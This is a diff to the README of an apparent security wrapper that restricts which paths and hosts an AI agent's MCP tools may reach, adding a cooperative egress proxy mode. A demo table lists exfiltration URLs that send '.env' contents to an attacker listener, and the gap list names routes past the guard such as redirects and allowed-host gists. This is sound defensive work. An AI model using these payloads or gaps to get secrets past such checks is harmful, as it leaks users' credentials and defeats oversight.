@@ -182,15 +182,17 @@ is never echoed and never logged.
 - **Servers you did not wrap, and tools with no `paths`/`egress` rule.** The
   startup line in the host's server log says how many tools the policy covers:
   `toolgate[fetch]: 1 of 1 tools constrained (default: block); audit: ...`.
-- **Redirects the server follows itself.** Probed on 2026-10-03:
-  `mcp-server-fetch` follows a 302 from an allowed host to any other host.
-  toolgate checks the URL it is given, so an allowed page that redirects
-  leaks. The demo below shows this case rather than hiding it. Containment
-  (an OS sandbox, Docker MCP Gateway) covers it; toolgate does not.
+- **Redirects the server follows itself, unless network mode is on.** Probed
+  on 2026-10-03: `mcp-server-fetch` follows a 302 from an allowed host to any
+  other host. The argument-level check sees only the URL it is given, so with
+  `network: off` (the default) an allowed page that redirects leaks.
+  [Network mode](#network-mode-cooperative) closes this for HTTP clients that
+  honour proxy variables; the demo below shows both.
 - **Exfiltration through an allowed host**, such as a gist or an issue comment
   on an allowlisted GitHub.
 - **Traffic a server originates on its own**, and shell or exec tools whose
-  network access is not an argument.
+  network access is not an argument, except, with network mode on, HTTP
+  traffic from a client that honours proxy variables.
 - **PII redaction covers `tools/call` results only.** `resources/read`,
   `prompts/get` and notifications pass unredacted.
 - **Paths are compared as text.** Symlinks are not resolved, so a symlink
@@ -211,6 +213,67 @@ a string must be named in `path_args`, `url_args` or `ignore_args` (defaults:
 `path`, `paths`, `source`, `destination` and `url`, `uri`, `href`). A tool
 with an unnamed one is withheld from the host's tool list and stderr says
 which argument to add; an argument the schema does not declare is refused.
+
+### Network mode (cooperative)
+
+`network: enforce` in a policy file makes `wrap` run a small forward proxy on
+127.0.0.1 for that server and point the server's `HTTP_PROXY`, `HTTPS_PROXY`
+and `ALL_PROXY` at it. Every connection the server's HTTP client makes,
+redirect hops included, is then checked against the same egress entries the
+rules hold (their union for that server, since a connection does not say
+which tool opened it), and refused with a 403 that names the cause.
+`network: audit` checks and logs every connection but refuses none on policy
+grounds. The default is `off`, which leaves the server's environment exactly
+as it was.
+
+```yaml
+network: enforce
+tool_calls:
+  default: block
+  rules:
+    fetch.fetch:
+      egress: ["docs.python.org"]
+```
+
+**It is cooperative, not containment.** It covers clients that read proxy
+variables, checked per client family in
+[`tests/test_proxy_clients.py`](tests/test_proxy_clients.py): httpx (which
+`mcp-server-fetch` uses) and Node 24's built-in fetch (`wrap` sets
+`NODE_USE_ENV_PROXY=1`) send every destination through the proxy, loopback
+included. A client that ignores proxy variables connects directly and is not
+covered; a test asserts that such a client still leaks. For containment use an
+OS sandbox or a container.
+
+What else it does, and what it costs:
+
+- It decides on the target the client names (the CONNECT `host:port` or the
+  absolute `http://` URL), never on the Host header, and connects to the
+  checked IP address. A hostname entry may not resolve to loopback, private,
+  link-local or cloud-metadata addresses (a rebinding name is refused); only a
+  `localhost` entry may reach loopback, and only an IP-literal entry may reach
+  the private address it names. An intranet host allowed by name is therefore
+  refused in network mode; name it by IP instead.
+- A name outside the allowlist is refused before it is looked up, so the DNS
+  query cannot carry data out.
+- The proxy requires a per-run token, given to the server in its proxy URL. It
+  stops other users and unrelated processes from using the port; a process
+  running as the same user can read the server's environment and is not
+  stopped. The token is never logged.
+- Each connection is an audit row (`outcome = 'network_egress'`, rule
+  `<server>.network.egress`) with its destination and whether a call in flight
+  named that host and port (`divergence`: `matched`, `unmatched`,
+  `ungated_call`, `no_call`).
+- `wrap` refuses to start if the environment already names an upstream proxy:
+  chaining is not supported.
+- **Launchers need their cache.** `uvx` and `npx` ask their package index
+  before starting the server, through the proxy, and are refused. Start the
+  server once without network mode (`uvx mcp-server-fetch==2026.8.18 --help`
+  fills the cache), then use `uvx --offline ...` or `npx --offline ...` in the
+  snippet, or a preinstalled server. If the server exits before saying
+  anything, stderr says so.
+- Latency: on the Windows dev machine, 1 KB p99 added rose from 1.39-1.47 ms
+  with the mode off to 1.51-1.52 ms with `enforce` (two runs each,
+  [`docs/PROXY-LATENCY.md`](docs/PROXY-LATENCY.md)).
 
 ### Quickstart (Claude Code)
 
@@ -302,7 +365,7 @@ pinned servers ([`tests/test_demo_fixtures.py`](tests/test_demo_fixtures.py),
 | `http://127.0.0.1:<attacker>/?d=<.env>` | canary reaches the listener | refused, `fetch.fetch.egress`; listener receives nothing |
 | `http://127.0.0.1:<attacker>\@localhost:<page>/?d=...` | canary reaches the listener | refused; listener receives nothing |
 | `http://localhost:<attacker port>/?d=...` | canary reaches the listener | refused (port not allowed); listener receives nothing |
-| allowed page that answers 302 to the attacker | canary reaches the listener | **canary still reaches the listener** (not covered, see above) |
+| allowed page that answers 302 to the attacker | canary reaches the listener | **canary still reaches the listener** with `network: off` (the default); refused by the proxy with `network: enforce`, listener receives nothing |
 
 The reads and the allowed page fetch work the same with toolgate on, and
 every line toolgate does not need to change is forwarded byte-for-byte: a
